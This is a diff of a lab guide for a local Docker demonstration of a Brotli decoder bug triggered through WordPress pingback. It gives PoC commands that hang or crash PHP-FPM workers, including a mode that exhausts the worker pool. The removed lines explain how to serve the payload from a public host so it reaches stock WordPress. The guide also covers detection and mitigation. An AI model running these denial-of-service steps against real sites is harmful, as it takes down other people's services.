@@ -1,16 +1,14 @@
-# Lab setup and operations
+# Lab guide
 
 ## Services
 
-| Service | Image | Role | Host port |
-|---|---|---|---|
-| `db` | `mariadb:11.4` | WordPress database | — |
-| `wordpress` | official `wordpress:php8.3-fpm` (digest pinned) | PHP-FPM + vulnerable `libbrotlidec` | — |
-| `nginx` | `nginx:1.27-alpine` | HTTP front end | `8080` |
-| `attacker` | built from `lab/attacker` | payload generator + HTTP server | `8081` |
-| `wp-init` | `wordpress:cli` | one-shot WordPress installer | — |
-
-The default Compose project name is `brotli-pingback-lab`.
+| Service | Image | Port |
+|---|---|---|
+| `db` | `mariadb:11.4` | — |
+| `wordpress` | official `wordpress:php8.3-fpm` (pinned digest) | — |
+| `nginx` | `nginx:1.27-alpine` | `8080` |
+| `attacker` | built from `lab/attacker` | `8081` |
+| `wp-init` | `wordpress:cli` | — |
 
 ```text
 WordPress  http://localhost:8080
@@ -19,348 +17,138 @@ payload    http://localhost:8081/health
 admin      http://localhost:8080/wp-admin/  (admin / admin)
 ```
 
-The admin credentials are lab-only. Do not expose this stack.
+The WordPress image is stock except for a 10-line mu-plugin that allowlists
+the Docker-internal `attacker` hostname. The PHP-FPM pool is the stock
+`www.conf`: `pm = dynamic`, `pm.max_children = 5`, no
+`request_terminate_timeout`.
 
----
-
-## First start
+## Start
 
 ```bash
 cp .env.example .env
 make up
-```
-
-`make up` does two things:
-
-1. `docker compose up -d --build` starts db, wordpress, nginx, attacker.
-2. `docker compose run --rm wp-init` installs WordPress and creates the
-   default Hello World post if the database is empty.
-
-The installer is idempotent; running `make init` again is safe.
-
-Check the result:
-
-```bash
 make probe
-```
-
-Expected:
-
-```text
-[*] target      : http://localhost:8080
-[*] GET /       : HTTP 200 in 0.0s
-[*] title       : Brotli Pingback Lab
-[*] xmlrpc.php  : HTTP 200 in 0.0s
-[+] pingback.ping is exposed
-```
-
-`GET /xmlrpc.php` returns 405 with “XML-RPC server accepts POST requests
-only.” That is normal; `make probe` uses a POST.
-
----
-
-## Verify the vulnerable stack
-
-```bash
 make verify
 ```
 
-It prints the PHP/curl/Brotli versions and then performs a behavioural test:
-fetch `http://attacker:8080/small.br` with `CURLOPT_ENCODING=''` and a 6s
-external timeout.
+`make up` builds the lab and runs the idempotent WordPress installer.
+`make verify` checks the PHP/curl/Brotli stack with a 6-second behavioural
+test against `/small.br`.
+
+## Modes
+
+```bash
+# Is pingback exposed?
+python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
+
+# 86-byte hang: one worker at 100% CPU
+make hang
+
+# 23 MB crash: one SIGSEGV
+make crash
+
+# Recover immediately from stuck workers
+make restart
+```
+
+`make hang` prints a client timeout and leaves one worker spinning. The stock
+FPM config has no request timeout, but `max_execution_time = 30` ends the
+request with exit code 124 after ~30 seconds. `make restart` is faster.
+
+`make crash` prints an HTTP 502 and a SIGSEGV in the log. One request is
+enough. To exhaust the default five-worker pool:
+
+```bash
+python3 poc/pingback_poc.py --target http://localhost:8080 --mode crash \
+  --payload-url http://attacker:8080/payload.br --workers 5 --show-logs
+```
+
+Five hangs (`--mode hang --workers 5`) occupy all workers for up to ~30
+seconds; `make restart` recovers immediately.
+
+## Expected output
+
+Crash:
 
 ```text
-[*] PHP / libcurl / Brotli versions
-php=8.3.x curl=8.x brotli=1.1.0 brotli_feature=yes
-
-[*] libbrotli package
-Version: 1.1.0-2+b7
-
-[*] behavioural test ...
-[+] VULNERABLE: the decoder loop did not return within 6s
+[1] <- HTTP 502 in 2.7s
+    crashed    1
+[!] attack signal observed
+[*] php-fpm log
+    WARNING: [pool www] child 10 exited on signal 11 (SIGSEGV - core dumped)
 ```
 
-If it returns quickly, the image was updated or the payload was not decoded.
-Check that `libbrotli1` is older than 1.0.10 / 1.1.1 / 1.2.1 and that
-`curl_version()['features']` has `CURL_VERSION_BROTLI`.
-
----
-
-## Run the PoC
-
-### Probe only
-
-```bash
-make probe
-# or
-python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
-```
-
-### 86-byte hang
-
-```bash
-make hang
-# or
-python3 poc/pingback_poc.py \
-  --target http://localhost:8080 \
-  --mode hang \
-  --payload-url http://attacker:8080/small.br \
-  --workers 1 --count 1 --timeout 12 --show-logs
-```
-
-The stock image uses `pm = dynamic` with `pm.max_children = 5` and no
-`request_terminate_timeout`. One pingback pins one worker at 100% CPU. PHP-FPM
-still has `max_execution_time = 30` for the FPM SAPI, so the request is
-eventually ended with exit code 124; the site stays up on the other workers
-in the meantime.
+Hang:
 
 ```text
 [1] <- timeout after 12.0s
-[*] summary
-    hung                     1
-[*] site after  : HTTP 200 in 0.0s (attack took 12.0s)
-[*] note: the stock php-fpm config has no request_terminate_timeout;
-    PHP-FPM max_execution_time (30s) is the fallback. Use
-    `make restart` to recover immediately.
+    hung       1
+[!] attack signal observed
+[*] site after : HTTP 200 in 0.0s
+[*] stock FPM has no request timeout; max_execution_time ends a
+    stuck worker in ~30s. Use `make restart` to recover now.
 ```
-
-After roughly 30 seconds the master logs:
-
-```text
-WARNING: [pool www] child 10 exited with code 124 after 37.713889 seconds from start
-```
-
-`make hang-pool` sends five concurrent requests, which occupy all five
-workers for up to ~30 seconds and take the site down for that window.
-`make restart` recovers immediately.
-
-If you mount the optional `lab/php-fpm/zz-lab.example.conf`, php-fpm gets a
-15-second `request_terminate_timeout` and logs:
-
-```text
-WARNING: [pool www] child 43 execution timed out (15.0 sec), terminating
-WARNING: [pool www] child 43 exited on signal 15 (SIGTERM) after 15.1 seconds from start
-```
-
-### 23 MB crash
 
 ```bash
-make crash
-# or
-python3 poc/pingback_poc.py \
-  --target http://localhost:8080 \
-  --mode crash \
-  --payload-url http://attacker:8080/payload.br \
-  --workers 1 --count 1 --timeout 30 --show-logs
+docker stats --no-stream --format '{{.Name}} cpu={{.CPUPerc}}' \
+  $(docker compose ps -q wordpress)
+# brotli-pingback-lab-wordpress-1 cpu=99.29%
 ```
 
-Each pingback makes the worker decode the 23 MB stream and die with
-`SIGSEGV`. One request is enough to prove the bug. Look for:
-
-```text
-WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 1.2 seconds from start
-```
-
-The site stays up after a single crash because php-fpm respawns the worker.
-`make crash-pool` sends five concurrent requests to exhaust the default
-five-worker pool.
-
----
-
-## Inspecting the worker pool
+## Logs
 
 ```bash
-docker compose logs -f wordpress
-docker compose exec wordpress ps aux | grep php-fpm
-docker compose exec wordpress sh -c 'ss -ltnp | grep 9000'
+make logs
+docker compose logs wordpress | grep -E 'SIGSEGV|signal 11|code 124'
 ```
 
-`php-fpm` runs as PID 1 in the container. The master logs child exits
-(including `SIGSEGV`) to stdout even with the stock config.
+The php-fpm master logs child exits even with the stock config. Worker stdout
+is not captured by default; use `catch_workers_output = yes` if you need it.
 
-To watch CPU during a hang:
+## Detect and mitigate
 
-```bash
-docker stats $(docker compose ps -q wordpress)
-```
+Detection:
 
-A single hung worker sits near 100% of one core.
+* `POST /xmlrpc.php` ending in 502/504 after several seconds;
+* an outbound fetch from the web tier to a new/short-lived host;
+* a worker at 100% CPU without a PHP error;
+* `child ... exited on signal 11 (SIGSEGV)` or `exited with code 124`;
+* a 20+ MB outbound response to the web tier.
 
----
+Mitigation:
 
-## Changing the lab
-
-### Worker limits
-
-The stock `www.conf` is `pm = dynamic`, `pm.max_children = 5`, with no
-`request_terminate_timeout`. That is enough for the crash: a SIGSEGV kills
-the worker regardless of pool settings. A hang is bounded by PHP-FPM's
-`max_execution_time = 30` (exit code 124).
-
-For a deterministic four-worker static pool and a 15-second request timeout,
-uncomment this volume in `docker-compose.yml`:
-
-```yaml
-- ./lab/php-fpm/zz-lab.example.conf:/usr/local/etc/php-fpm.d/zz-lab.conf:ro
-```
-
-The example file contains:
-
-```ini
-[www]
-pm = static
-pm.max_children = 4
-pm.max_requests = 0
-request_terminate_timeout = 15s
-catch_workers_output = yes
-decorate_workers_output = no
-```
-
-Then `docker compose up -d --force-recreate wordpress`. With this config,
-`make hang` is killed after 15 seconds and the site recovers by itself;
-`make hang-pool` needs four requests instead of five.
-
-### Different WordPress version
-
-The compose file pins:
-
-```yaml
-image: wordpress:php8.3-fpm@sha256:96b154...
-```
-
-Pinning the digest is deliberate: a future `wordpress:php8.3-fpm` rebuild
-may ship a patched `libbrotli1`, and the lab would silently stop working.
-If you change the tag, run `make verify` afterwards.
-
-### Stock WordPress (no mu-plugin)
-
-Remove this volume from `docker-compose.yml`:
-
-```yaml
-- ./lab/wordpress/mu-plugins:/var/www/html/wp-content/mu-plugins:ro
-```
-
-Then serve the payload from a public host that **preserves the raw bytes**
-(for example a VPS with a public IP) so `wp_safe_remote_get()` accepts the
-source. An HTTP proxy or CDN that decodes `Content-Encoding: br` will
-neutralize the payload.
-
-### Different payload delay
-
-```bash
-CHUNK_DELAY=2.0 docker compose up -d --force-recreate attacker
-```
-
-A longer delay gives a slow client more time to drain the 23 MB before the
-tail, but it counts against WordPress's 10-second HTTP timeout.
-
----
+* patch Brotli (1.0.10 / 1.1.1 / 1.2.1) and every runtime that embeds it;
+* disable or restrict XML-RPC/pingback if unused;
+* restrict egress from the web tier to an allowlist;
+* reject or decode `Content-Encoding: br` from untrusted peers at a patched
+  proxy;
+* set `request_terminate_timeout`, `pm.max_children`, and `pm.max_requests`;
+* the 150 KB pingback cap is not a fix.
 
 ## Troubleshooting
 
-### `make up` fails in `wp-init`
+**`make probe` cannot find `pingback.ping`** — XML-RPC is disabled or nginx
+does not pass `/xmlrpc.php` to PHP-FPM. The lab image has no plugins.
 
-```bash
-docker compose logs db
-docker compose logs wordpress
-docker compose run --rm wp-init
-```
+**`make crash` returns a fault instead of 502** — WordPress could not fetch
+the payload. Check `curl http://localhost:8081/health`, the `attacker` host,
+and the mu-plugin. The 23 MB transfer must finish within the 10-second
+pingback timeout.
 
-Common causes:
+**No SIGSEGV in the log** — run `make verify`. If the decoder is patched, the
+stream is rejected and Requests retries without decoding. Rebuild on the
+pinned image digest.
 
-* MariaDB is still initializing — wait for the healthcheck and retry.
-* The `wp_data` volume contains a half-installed site — `make reset` and
-  start again.
-* Permissions on a bind-mounted `wp-content` directory — the official image
-  runs as `www-data` (uid 33).
+**No SIGSEGV after a config change** — the crash tail is specific to the
+x86-64 `BrotliDecoderState` layout of Brotli 1.1.0/1.2.0. It is tested on the
+pinned image.
 
-### `make probe` says pingback is not exposed
+**Ports in use** — change `WP_PORT` / `ATTACKER_PORT` in `.env`, then
+`make up`.
 
-* A security plugin disabled XML-RPC. The lab image has no plugins; check
-  `docker compose exec wordpress ls wp-content/plugins`.
-* `xmlrpc.php` is blocked by nginx or a WAF. Check
-  `docker compose logs nginx`.
-* `WP_HTTP_BLOCK_EXTERNAL` or a custom filter blocks outbound requests.
+## Limits
 
-### `make hang` returns an XML-RPC fault instead of hanging
-
-The payload was fetched but the decoder did not spin. Possible reasons:
-
-* the image is patched — run `make verify`;
-* the payload URL is wrong — `curl -v http://localhost:8081/small.br`
-  should show `Content-Encoding: br` and 86 bytes;
-* WordPress did not send `Accept-Encoding: br` — the Requests transport may
-  be using the `Fsockopen` fallback instead of cURL. Check
-  `php -m | grep curl` and `curl_version()`.
-
-### `make crash` returns “The source URL does not exist”
-
-WordPress could not fetch the payload. Check, in order:
-
-1. `curl -v http://localhost:8081/health` from the host;
-2. `docker compose exec wordpress php -r 'var_dump(@file_get_contents("http://attacker:8080/health"));'`;
-3. the mu-plugin is mounted:
-   `docker compose exec wordpress ls -l wp-content/mu-plugins`;
-4. the source URL is public and byte-preserving (a decoding CDN will not
-   work), or the host is `attacker` (local mode);
-5. the 23 MB transfer did not exceed the 10-second timeout.
-
-### `make crash` returns a fault, no SIGSEGV
-
-The worker survived. Run `make verify`; if the decoder is patched, the 23 MB
-stream is rejected as a format error and Requests retries without decoding.
-Switch to the pinned image digest or rebuild the lab on a vulnerable base.
-
-### No `SIGSEGV` in the logs
-
-* php-fpm may not log child exits at your log level; check
-  `docker compose logs wordpress` without filters.
-* If you enabled the optional `request_terminate_timeout`, make sure it is
-  longer than the 23 MB transfer (about 3 seconds locally).
-* The payload may have been served without the chunk boundary. Check the
-  attacker logs and the `CHUNK_DELAY` value.
-
-### Ports 8080/8081 are already in use
-
-```bash
-cat > .env <<'EOF'
-WP_PORT=8090
-ATTACKER_PORT=8091
-CHUNK_DELAY=1.0
-EOF
-make up
-```
-
-The Makefile includes `.env`, so `make probe` follows the new port.
-
-### Apple Silicon / arm64
-
-The crash tail depends on the x86-64 `BrotliDecoderState` layout. Use an
-x86-64 host, or force emulation:
-
-```bash
-DOCKER_DEFAULT_PLATFORM=linux/amd64 make up
-```
-
-Emulation is slower and the 23 MB payload may exceed the pingback timeout.
-The 86-byte hang does not depend on struct offsets and works either way.
-
-### Resetting
-
-```bash
-make down      # stop, keep volumes
-make reset     # stop and delete db_data + wp_data
-make clean     # remove generated payloads and __pycache__
-```
-
----
-
-## Resource use
-
-* Images: ~1.2 GB (WordPress FPM is the largest).
-* Runtime: ~250 MB RAM for db + wordpress + nginx + attacker.
-* The attacker holds the 23 MB payload in memory and writes it to
-  `/payloads` inside the container.
-
-The lab does not need Internet access at runtime. Internet is only needed
-to pull the Docker images.
+* Local lab only; the payload server is not a public service.
+* The 23 MB transfer must preserve the chunk boundary; a buffering or
+  `br`-decoding proxy will neutralize it.
+* No RCE is attempted or provided.
